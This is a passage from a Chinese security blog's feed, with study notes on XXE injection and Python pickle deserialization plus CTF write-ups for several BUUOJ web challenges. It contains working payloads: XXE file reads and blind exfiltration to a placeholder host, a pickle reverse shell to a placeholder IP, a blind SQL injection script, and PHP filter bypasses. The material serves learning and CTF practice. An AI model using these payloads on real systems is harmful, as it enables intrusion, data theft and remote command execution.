+<h2 id="xxe-payload-格式">XXE Payload 格式</h2>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688388975658.jpg" alt="" loading="lazy"></figure>
+<h2 id="dtd的使用主要的攻击方式">DTD的使用（主要的攻击方式</h2>
+<h3 id="dtd的引用方式">DTD的引用方式</h3>
+<p>在XML文档中，可以通过两种方式引用DTD：内部引用和外部引用。</p>
+<p><strong>内部DTD</strong>：直接在XML文档中定义DTD。这通常发生在XML文档的声明部分，紧接着在根元素之前。定义内部DTD的语法如下：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element [ 
+&lt;!-- DTD 内容 --&gt; 
+]&gt; 
+&lt;root-element&gt;
+    &lt;!-- XML 文档内容 --&gt;
+&lt;/root-element&gt;
+</code></pre>
+<p>比如：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+    &lt;!ELEMENT user ANY &gt;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;admin&lt;/username&gt;
+    &lt;password&gt;admin&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<p><strong>外部DTD</strong>：在外部文件中定义DTD，并在XML文档中通过URI引用。外部DTD可以在多个XML文档中重复使用。定义外部DTD的语法如下：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element SYSTEM &quot;URL&quot;&gt; 
+&lt;root-element&gt;
+    &lt;!-- XML 文档内容 --&gt;
+&lt;/root-element&gt;
+</code></pre>
+<h3 id="dtd实体声明重点">DTD实体声明（重点）</h3>
+<p>DTD实体（Entity）是一种机制，可以用于定义XML中可重用的字符串或代码片段。</p>
+<p>实体通常可以分为两种类型：内部实体和外部实体。</p>
+<p><strong>内部实体</strong>：内部实体是在DTD中定义并在XML文档中使用的实体。它的定义方法如下</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe &quot;skyblu3&quot;&gt;
+</code></pre>
+<p>这个实体在XML文档中通过<code>&amp;实体名称;</code>的方式引用</p>
+<pre><code class="language-xml">&lt;username&gt;&amp;xxe;&lt;/username&gt;
+</code></pre>
+<p><strong>外部实体</strong>：外部实体是在DTD中定义但其内容存储在外部文件中的实体。外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：<br>
+<img src="https://skyblu3519.github.io/post-images/1688391829123.png" alt="" loading="lazy"></p>
+<p>使用方法：</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;URI/URL&quot;&gt;
+</code></pre>
+<p>例子：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;&amp;xxe;&lt;/username&gt;
+    &lt;password&gt;admin&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1688392068149.png" alt="" loading="lazy"></figure>
+<p>除了内部实体和外部实体，XML还有一个比较特殊的实体：<strong>实体参数</strong>。</p>
+<p>上面的实体都是用于XML文档中的，而实体参数则是用于在DTD中定义可重用的字符串或代码片段。</p>
+<p>实体参数的声明和实体一样有内部和外部两种</p>
+<pre><code class="language-xml">&lt;!ENTITY % name &quot;&lt;!ENTITY xxe 'skyblue3'&gt;&quot;&gt;
+&lt;!ENTITY % name SYSTEM &quot;URI&quot;&gt;
+</code></pre>
+<p>实体参数通过<code>%name;</code>来引用</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY % name &quot;&lt;!ENTITY xxe 'skyblue3'&gt;&quot;&gt;
+    %name;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;&amp;xxe;&lt;/username&gt;
+    &lt;password&gt;admin&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1688393743432.png" alt="" loading="lazy"></figure>
+<p>来看下外部引入，在<code>xml.dtd</code>写入</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe &quot;skyblue3&quot;&gt;
+</code></pre>
+<p>外部引用这个实体参数，与上面达到同样的效果</p>
+<pre><code class="language-xml">    &lt;!ENTITY % name SYSTEM &quot;file:///tmp/xml.dtd&quot;&gt;
+    %name;
+</code></pre>
+<h1 id="攻击思路">攻击思路</h1>
+<p>从上面的例子对XXE最大的感受就是，它可以请求指定URL/URI的内容，并在条件允许的情况下把请求的内容加载出来。所以XXE能做的事还是非常多的（DDoS，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等）。</p>
+<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
+<p>这里以文件读取来测试有回显和无回显两种情况。</p>
+<h2 id="有回显">有回显</h2>
+<p>有回显的情况很好理解，之前的例子中已经有了。</p>
+<p>还可以利用实体参数来做，在evil.dtd中写入</p>
+<pre><code class="language-xml">&lt;!ENTITY evil SYSTEM &quot;file:///Users/ea5ter/tmp/flag&quot; &gt;
+</code></pre>
+<p>像这样引用</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+        &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;
+        %dtd;
+]&gt;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/1688397164769.jpg" alt="" loading="lazy"></figure>
+<h2 id="无回显">无回显</h2>
+<p>将测试代码中的<code>echo $creds-&gt;asXML();</code>注释掉。</p>
+<p>对于无回显的情况，需要使用外部实体将数据带出来。具体操作如下：</p>
+<p>编写<code>evil.dtd</code>，放在服务器上。</p>
+<pre><code class="language-xml">&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip:9999/?data=%file;'&gt;&quot;
+&gt;
+%all;
+</code></pre>
+<p>DTD部分：</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///Users/ea5ter/tmp/flag&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://IP/evil.dtd&quot;&gt;
+%dtd;
+%send;
+</code></pre>
+<p>整个流程如下：</p>
+<ol>
+<li>解析器首先解析XML文档的DTD。在这个过程中，它遇到了<code>%file</code>实体的定义，于是解析器读取指定的文件，并将其内容转换为Base64格式。</li>
+<li>解析器然后处理<code>%dtd</code>实体的定义。首先从指定的URL加载<code>evil.dtd</code>文件，并解析其中的内容。在这个过程中，遇到了<code>%all</code>实体的定义，于是它创建了一个名为<code>%send</code>的实体。</li>
+<li>最后，处理<code>%send</code>实体的引用。这导致解析器向服务器发送了一个请求，请求参数<code>data</code>的值是<code>%file</code>实体的值。</li>
+</ol>
+<p>数据顺利外带<br>
+<img src="https://skyblu3519.github.io/post-images/1688397567862.png" alt="" loading="lazy"></p>
+<p>不过这里我还是有点疑问，为什么<code>%send</code>一定要写在外部实体中？直接写出来就不行呢？🤔</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///Users/ea5ter/tmp/flag&quot;&gt;
+&lt;!ENTITY % send SYSTEM &quot;http://IP:9999/?p=%file;&quot;&gt;
+%send;
+</code></pre>
+<p>之后搜索一下🔍</p>
+<blockquote>
+<p>One Day Later......</p>
+</blockquote>
+<p>现在来回答上面这个问题，主要涉及两个DTD的规则。</p>
+<p>首先，实体参数在同一个DTD中不能在<strong>声明</strong>中引用，只能位于其他声明之间。</p>
+<pre><code class="language-xml">&lt;!ENTITY % name &quot;skkyblu3&quot;&gt;
+&lt;!ENTITY xxe &quot;%name;&quot;&gt;
+</code></pre>
+<p>所以上面的<code>xxe</code>并不会被替换为<code>&lt;!ENTITY xxe &quot;skkyblu3&quot;&gt;</code>，相反解析这个DTD会产生报错。这种类型的替换形式（在声明中进行替换）只能用于DTD外部子集。</p>
+<p>要做到上面的替换，我们需要在一个外部dtd中写入：</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe &quot;%name;&quot;&gt;
+</code></pre>
+<p>再去加载</p>
+<pre><code class="language-xml">&lt;!ENTITY % name &quot;skkyblu3&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://IP/sky.dtd&quot;&gt;
+%dtd;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/1688440284008.png" alt="" loading="lazy"></figure>
+<p>因此，payload中读取到的<code>%file;</code>就只能通过引入外部的参数实体<code>http://ip/evil.dtd</code>，在这个外部实体中加载。</p>
+<p>在知道引入外部参数实体的原因后，我们再看到<code>evil.dtd</code>的写法</p>
+<pre><code class="language-xml">&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip:9999/?data=%file;'&gt;&quot;
+&gt;
+%all;
+</code></pre>
+<p>这里的<code>send</code>是定义在<code>all</code>这个<strong>内部参数实体</strong>中的，为什么不能直接写出来呢？像下面这样</p>
+<pre><code class="language-xml">&lt;!ENTITY % send SYSTEM &quot;http://ip:9999/?data=%file;&quot;&gt;
+</code></pre>
+<p>这是因为XML规范规定，参数实体不能<strong>直接用于构成URI</strong>。这意味着<code>SYSTEM &quot;http://ip:9999/?data=%file;&quot;</code>这里是不能直接使用<code>%file;</code>的。</p>
+<p>所以需要用<code>all</code>这个内部参数实体来引入<code>send</code>，再使用<code>%all;</code>来展开这个实体。</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://itpcb.com/a/1885669">DTD实体之参数实体</a><br>
+<a href="https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br>
+<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41">歪？我想要一个XXE。</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Python Pickle反序列化漏洞学习笔记]]></title>
+        <id>https://skyblu3519.github.io/post/python-pickle-fan-xu-lie-hua-lou-dong/</id>
+        <link href="https://skyblu3519.github.io/post/python-pickle-fan-xu-lie-hua-lou-dong/">
+        </link>
+        <updated>2023-07-03T06:35:45.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>只是简单的学习笔记</p>
+</blockquote>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之 Python 反序列化漏洞</a><br>
+<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a><br>
+这两篇文章写得已经非常清晰了，如果要学建议看上面的🤓</p>
+<h1 id="光速qa">光速QA</h1>
+<h2 id="qpickle是什么">Q：pickle是什么？</h2>
+<p>A：pickle是python下的序列化与反序列化包。</p>
+<h2 id="qpickle如何进行序列化与反序列化">Q：pickle如何进行序列化与反序列化？</h2>
+<p>A：通过四个函数</p>
+<pre><code class="language-python"># 序列化
+pickle.dump(文件) 
+pickle.dumps(字符串)
+
+# 反序列化
+pickle.load(文件)
+pickle.loads(字符串) 
+</code></pre>
+<h2 id="q举个例子">Q：举个例子</h2>
+<p>A：</p>
+<pre><code class="language-python">import pickle
+class People(object):
+    def __init__(self,name = &quot;skkyblu3&quot;):
+        self.name = name
+
+    def say(self):
+        print &quot;Hello ! My friends&quot;
+
+a = People()
+c = pickle.dumps(a)
+d = pickle.loads(c)
+d.say()
+</code></pre>
+<h2 id="q一个对象被序列化后是什么样的">Q：一个对象被序列化后是什么样的？</h2>
+<p>A：上面People类序列化之后为</p>
+<pre><code>ccopy_reg
+_reconstructor
+p0
+(c__main__
+People
+p1
+c__builtin__
+object
+p2
+Ntp3
+Rp4
+(dp5
+S'name'
+p6
+S'skkyblu3'
+p7
+sb.
+</code></pre>
+<h2 id="q这串内容是如何被解析的">Q：这串内容是如何被解析的？</h2>
+<p>A：pickle解析依靠Pickle Virtual Machine (PVM)进行。</p>
+<ul>
+<li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存</li>
+<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
+<li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
+</ul>
+<p>PVM操作码（直接盗图）<br>
+<img src="https://skyblu3519.github.io/post-images/1688371211756.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688371219924.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688371226013.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688371236915.png" alt="" loading="lazy"></p>
+<p>考虑下面的内容，这个在反序列化的时候会执行<code>os.system('ls')</code></p>
+<pre><code class="language-python">import pickle
+data = &quot;&quot;&quot;cos
+system
+(S'ls'
+tR.
+&quot;&quot;&quot;
+pickle.loads(data)
+</code></pre>
+<p>结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的：</p>
+<ol>
+<li>c 后面是模块名，换行后是类名,于是将 os.system 放入栈中</li>
+<li>( 这个是标记符，我们将一个 Mark 放入栈中</li>
+<li>S 后面是字符串，我们放入栈中</li>
+<li>t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （'ls',），同时标记 Mark 消失</li>
+<li>R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system('ls'),然后将结果再存入栈中</li>
+</ol>
+<p>用动图来帮助理解一下（这个好诶！）：<br>
+<img src="https://skyblu3519.github.io/post-images/1688366158371.gif" alt="" loading="lazy"><br>
+PVM解析<code>R</code>指令的过程动图：<br>
+<img src="https://skyblu3519.github.io/post-images/1688366442206.gif" alt="" loading="lazy"></p>
+<h2 id="q反序列化的原理大概清楚了可是要怎么利用捏">Q：反序列化的原理大概清楚了，可是要怎么利用捏？</h2>
+<p>A：和PHP一样，我们想在反序化的时候执行我们的代码。这就需要<code>__reduce__</code>这个魔术方法，这个方法是新式类(内置类)特有的。</p>
+<p>新式类（内置类）和旧式类（自建类）的区别在于有没有继承自<code>object</code>，如果一个类继承自<code>object</code>，那么它就是新式类。不过这个特性是Python2才有的，Python3开始，所有的类都被视为新式类，无论是否明确地继承自<code>object</code>。</p>
+<pre><code class="language-python"># 旧式类
+&gt;&gt;&gt; class A():
+...     pass
+...
+&gt;&gt;&gt; a = A()
+&gt;&gt;&gt; type(a)
+&lt;type 'instance'&gt;
+
+# 新式类
+&gt;&gt;&gt; class B(object):
+...     pass
+...
+&gt;&gt;&gt; b = B()
+&gt;&gt;&gt; type(b)
+&lt;class '__main__.B'&gt;
+</code></pre>
+<p>为了使用<code>__reduce__</code>我们的类需要继承自<code>object</code>。</p>
+<p>那么<code>__reduce__</code>是什么呢？</p>
+<blockquote>
+<p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型（这里指的就是新式类）的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化</p>
+</blockquote>
+<p>我们知道在PHP反序列化的时候，反序列化的类在代码中一定是声明过的。但在Python中，如果反序列化的类中有<code>__reduce__</code>，那么即使环境中没有声明，它也可以按照<code>__reduce__</code>中的方法进行反序列化，这样攻击面可以说是相当大了。下面通过一段代码来感受<code>__reduce__</code>的神奇：</p>
+<pre><code class="language-python">import pickle
+
+class A(object):
+    pass
+
+class B(object):
+    def __reduce__(self):
+        return (str, ())
+
+a = A()
+b = B()
+
+a_s = pickle.dumps(a)
+b_s = pickle.dumps(b)
+
+# 在环境中删除这两个类
+del A
+del B
+
+try:
+    # 对于不存在的类反序列失败
+    pickle.loads(a_s)       
+    print 'A is load'
+except Exception as e:
+    print e
+try:
+    # 实现了__reduce__的类，即使环境中没有定义，也能按照__reduce__中的方法反序列化
+    pickle.loads(b_s)       
+    print 'B is load'
+except Exception as e:
+    print e
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688375338574.png" alt="" loading="lazy"></figure>
+<p>那么<code>__reduce__</code>方法如何构造呢？<code>__reduce__</code>可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候。当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数。</p>
+<p>一个pickle EXP的简单demo</p>
+<pre><code class="language-python">import pickle
+import os
+
+class genpoc(object):
+    def __reduce__(self):
+        s = &quot;echo skkyblu3&quot;             # 要执行的命令
+        return (os.system, (s,))         # 返回元组
+
+e = genpoc()
+poc = pickle.dumps(e)
+print(poc)      # 反序列字符串
+</code></pre>
+<p>记一个反弹shell的demo，用到的是<code>python -c</code>：</p>
+<pre><code class="language-python">class A(object):
+    def __reduce__(self):
+        a = &quot;&quot;&quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&quot;&quot;&quot;
+        return (os.system,(a,)) 
+</code></pre>
+<p>所以上周那道<code>ikun</code>就是用了eval来读取flag的内容，还是比较简单的</p>
+<pre><code class="language-python">import os
+import pickle
+import urllib
+
+class exp(object):
+    def __reduce__(self):
+        return (eval,(&quot;open('/flag.txt').read()&quot;,))
+
+a=exp()
+s=pickle.dumps(a)
+print urllib.quote(s)
+</code></pre>
+<h2 id="q还有内容吗">Q：还有内容吗？</h2>
+<p>A：剩下的内容主要有三个</p>
+<ul>
+<li>序列化更复杂的代码去执行</li>
+<li>手写 opcode</li>
+<li>pker的使用，用于将Python源代码自动转换为Pickle opcode的工具</li>
+</ul>
+<h2 id="q为什么不写了">Q：为什么不写了？</h2>
+<p>A：今天不想看了，之后再说吧🥱</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一周西踢艾福（4）]]></title>
+        <id>https://skyblu3519.github.io/post/yi-zhou-xi-ti-ai-fu-4/</id>
+        <link href="https://skyblu3519.github.io/post/yi-zhou-xi-ti-ai-fu-4/">
+        </link>
+        <updated>2023-07-02T09:54:05.000Z</updated>
+        <content type="html"><![CDATA[<p>abbababaababab</p>
+<h1 id="buu">BUU</h1>
+<h2 id="wustctf2020颜值成绩查询">[WUSTCTF2020]颜值成绩查询</h2>
+<p>和<code>[极客大挑战 2019]FinalSQL</code>一样，复习一下布尔盲注的二分查找。脚本如下</p>
+<pre><code class="language-python">import requests
+import time
+
+url = &quot;http://9a9cda55-1e8f-4cff-9221-917c5f669aba.node4.buuoj.cn:81/&quot;  # Target URL
+result = &quot;&quot;
+
+for i in range(1, 1000):  # adjust as needed
+    param_data = {}
+    low = 32
+    high = 128
+    mid = (low + high) // 2
+    while low &lt; high:
+        # injection_str = f&quot;1^(ASCII(substr((SELECT(group_concat(table_name))FROM(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})&quot;     # 表名
+        # injection_str = f&quot;1^(ASCII(substr((SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='flag')),{i},1))&gt;{mid})&quot;     # 列名
+        injection_str = f&quot;1^(ASCII(substr((SELECT(group_concat(value))FROM(flag)),{i},1))&gt;{mid})&quot;   # flag
+        param_data['stunum'] = injection_str
+
+        response = requests.get(url, params=param_data)
+        time.sleep(0.04)
+        if 'student number not exists.' in response.text:  # 在这个区域中
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) // 2
+
+    result += chr(mid)
+    print(&quot;Extracted so far: &quot; + result)
+    if mid == 32 or mid == 127:
+        break
+</code></pre>
+<h2 id="mrctf2020套娃">[MRCTF2020]套娃</h2>
+<pre><code class="language-php">$query = $_SERVER['QUERY_STRING'];
+
+ if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
+    die('Y0u are So cutE!');
+}
+ if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){
+    echo &quot;you are going to the next ~&quot;;
+}
+</code></pre>
+<p><code>$_SERVER['QUERY_STRING'];</code>会获得 URL 中 &quot;?&quot; 符号之后的部分。举个例子，如果 URL 是 <code>http://www.example.com/index.php?id=1&amp;image=awesome.jpg</code>，那么 <code>$_SERVER['QUERY_STRING']</code> 就是 <code>id=1&amp;image=awesome.jpg</code>。</p>
+<p>第一个判断的是<code>$query</code>中不能出现下滑线。想起之前的一道题，PHP变量解析漏洞，绕过的方式可以用空格<code>%20</code>或者点<code>%2e</code>。但是<code>%2b</code>和<code>%5b</code>不知道为什么无法通过。<br>
+<img src="https://skyblu3519.github.io/post-images/1688291740971.png" alt="" loading="lazy"></p>
+<p>第二个判断是<code>$_GET['b_u_p_t']</code>不为<code>23333</code>，但通过正则可以匹配到<code>23333</code>。绕过的方式是用换行符<code>%0a</code>绕过。</p>
+<p>payload：<code>/?b%2eu%2ep%2et=23333%0A</code>，得到下一关地址<code>/secrettw.php</code></p>
+<p>jsfuck丢到控制台<br>
+<img src="https://skyblu3519.github.io/post-images/1688291775530.png" alt="" loading="lazy"></p>
+<p>根据提示，post提交<code>Merak</code>参数得到源码</p>
+<pre><code class="language-php">&lt;?php 
+error_reporting(0); 
+include 'takeip.php';
+ini_set('open_basedir','.'); 
+include 'flag.php';
+
+if(isset($_POST['Merak'])){ 
+    highlight_file(__FILE__); 
+    die(); 
+} 
+
+
+function change($v){ 
+    $v = base64_decode($v); 
+    $re = ''; 
+    for($i=0;$i&lt;strlen($v);$i++){ 
+        $re .= chr ( ord ($v[$i]) + $i*2 ); 
+    } 
+    return $re; 
+}
+echo 'Local access only!'.&quot;&lt;br/&gt;&quot;;
+$ip = getIp();
+if($ip!='127.0.0.1')
+echo &quot;Sorry,you don't have permission!  Your ip is :&quot;.$ip;
+if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){
+echo &quot;Your REQUEST is:&quot;.change($_GET['file']);
+echo file_get_contents(change($_GET['file'])); }
+?&gt;
+</code></pre>
+<p>三个点：</p>
+<ul>
+<li><code>getIp()</code>：添加<code>client-ip</code>头</li>
+<li><code>file_get_contents($_GET['2333'])</code>：PHP伪协议<code>data:text/plain,todat is a happy day</code></li>
+<li><code>change($_GET['file'])</code>：根据<code>change</code>函数逻辑简单反解一下</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+$t = 'flag.php';
+$re = '';
+for($i=0;$i&lt;strlen($t);$i++){
+    $re .= chr ( ord ($t[$i]) - $i*2 );
+}
+echo base64_encode($re);    // ZmpdYSZmXGI=
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688291796730.png" alt="" loading="lazy"></figure>
+<h2 id="fbctf2019rceservice">[FBCTF2019]RCEService</h2>
+<p>命令执行<code>/?cmd={&quot;cmd&quot;:&quot;ls&quot;}</code>，有<code>index.php</code>，尝试读取。过滤了挺多东西的，之后发现这题的源码是提前给出的...但这里没有提示？（这个过滤确实够狠的）</p>
+<pre><code class="language-php">&lt;?php
+
+putenv('PATH=/home/rceservice/jail');
+
+if (isset($_REQUEST['cmd'])) {
+  $json = $_REQUEST['cmd'];
+
+  if (!is_string($json)) {
+    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
+  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
+  } else {
+    echo 'Attempting to run command:&lt;br/&gt;';
+    $cmd = json_decode($json, true)['cmd'];
+    if ($cmd !== NULL) {
+      system($cmd);
+    } else {
+      echo 'Invalid input';
+    }
+    echo '&lt;br/&gt;&lt;br/&gt;';
+  }
+}
+
+?&gt;
+</code></pre>
+<p>正则用多行匹配绕过，<code>cmd</code>期望接收到的是一个<code>JSON</code>格式，所以可以像下面这样：</p>
+<pre><code class="language-json">{
+  &quot;cmd&quot;: &quot;/home/rceservice&quot;
+}
+</code></pre>
+<p>因为这里设定了变量的执行环境，所以要用<code>/bin/cat</code>。payload：<code>cmd={%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a}</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688291824587.png" alt="" loading="lazy"></p>
+<h2 id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</h2>
+<pre><code class="language-php">&lt;?php
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;);
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST['guess'])) {
+  $guess = (string) $_POST['guess'];
+  if (hash_equals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?&gt;
+</code></pre>
+<p>一看解题点就是<code>highlight_file</code>上。</p>
+<p>首先看下 <code>$_SERVER['PHP_SELF']</code>是什么，<br>
+<img src="https://skyblu3519.github.io/post-images/1688291849981.png" alt="" loading="lazy"></p>
+<p>写个demo</p>
+<pre><code class="language-php">&lt;?php
+echo $_SERVER['PHP_SELF'];
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/1688291916049.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688291925664.png" alt="" loading="lazy"></p>
+<p>再看下<code>basename</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688291935642.png" alt="" loading="lazy"></p>
+<p>测试一下：</p>
+<pre><code class="language-php">&lt;?php
+echo basename(&quot;/index.php/config.php&quot;);
+// config.php
+echo basename(&quot;/index.php/config.php/&quot;);
+// config.php
+echo basename(&quot;/index.php/config.php/&quot;.&quot;\xff&quot;);     
+// config.php		去掉了尾部的不可见字符
+echo basename(&quot;\xff&quot;.&quot;/index.php/config.php/&quot;);
+// config.php		去掉了首部的不可见字符
+</code></pre>
+<p>对于正则：</p>
+<pre><code class="language-php">&lt;?php
+$s = 'config.php/'.urldecode('%ff');
+if (preg_match('/config\.php\/*$/i', $s)) {		// 对尾部的界定可以用不可见字符绕过
+    echo &quot;match&quot;;
+}else{
+    echo &quot;no match&quot;;	// 绕过匹配
+}
+if (preg_match('/config\.php\//i', $s)) {			// 没有对尾部界定，可以匹配到字符串config.php/
+    echo &quot;match&quot;;			// 正常匹配
+}else{
+    echo &quot;no match&quot;;
+}
+</code></pre>
+<p>综上，用不可见字符绕过正则。payload：<code>/index.php/config.php/%ff?source</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688291994505.png" alt="" loading="lazy"></p>
+<h2 id="ciscn2019-华北赛区-day1-web2ikun">[CISCN2019 华北赛区 Day1 Web2]ikun</h2>
+<p>要买到lv6，但是页面中并没有。爆破<code>/shop?page=2</code>中的<code>page</code>参数，找到有lv6的页面，标志图片名称。<br>
+<img src="https://skyblu3519.github.io/post-images/1688292003156.png" alt="" loading="lazy"></p>
+<pre><code class="language-python">import requests
+import time
+url = 'http://f07b7eb7-c746-470b-9d28-9053e401388c.node4.buuoj.cn:81/shop?page='
+for i in range(150, 200):
+    resp = requests.get(url + str(i))
+    time.sleep(0.04)
+    if 'lv6.png' in resp.text:
+        print('page is: ' + str(i))
+        break
+</code></pre>
+<p>lv6在180页<br>
+<img src="https://skyblu3519.github.io/post-images/1688292035545.png" alt="" loading="lazy"></p>
+<p>购买，价格改不了，但可以改折扣。<br>
+<img src="https://skyblu3519.github.io/post-images/1688292045515.png" alt="" loading="lazy"></p>
+<p><code>/b1g_m4mber</code>需要admin<br>
+<img src="https://skyblu3519.github.io/post-images/1688292054750.png" alt="" loading="lazy"></p>
+<p>jwt伪造</p>
+<ul>
+<li>快速入门：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">JWT是什么</a></li>
+<li>利用工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></li>
+</ul>
+<p>使用<code>docker run -it --rm  jwtcrack &lt;jwt&gt;</code>，🏃🏃🏃<br>
+<img src="https://skyblu3519.github.io/post-images/1688292091525.png" alt="" loading="lazy"></p>
